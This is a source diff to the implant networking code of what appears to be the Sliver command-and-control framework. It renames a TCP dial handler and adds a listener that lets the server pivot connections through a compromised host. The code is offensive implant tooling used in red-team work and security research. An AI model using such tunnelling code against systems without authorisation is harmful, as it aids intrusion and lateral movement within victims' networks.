@@ -19,15 +19,20 @@ package comm
 */
 
 import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	"fmt"
 	"io"
 	"net"
 
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
-// handleTCP - A connection coming from the server is destined to one of the implant's networks.
+// dialTCP - A connection coming from the server is destined to one of the implant's networks.
 // Forge local and/or remote TCP addresses and pass them to the dialer. Pipe the connection.
-func handleTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
+func dialTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
 	var srcAddr *net.TCPAddr
 	if info.LHost != "" || info.LPort == 0 {
 		srcAddr = &net.TCPAddr{
@@ -47,4 +52,19 @@ func handleTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
 	}
 	transport(src, dst)
 	return nil
+}
+
+// listenTCP - The implant is requested to start a TCP handler and return the connection
+// to the server, with the handler information passed in. This connection can be wrapped
+// into a tls.Conn, a SMTP one, etc, by the server, without the implant knowing anything about it.
+func listenTCP(handler *sliverpb.Handler) (ln net.Listener, err error) {
+	// {{if .Config.Debug}}
+	log.Printf("Starting Raw TCP listener on %s:%d", handler.LHost, handler.LPort)
+	// {{end}}
+	ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", handler.LHost, handler.LPort))
+	if err != nil {
+		return nil, err
+	}
+
+	return
 }
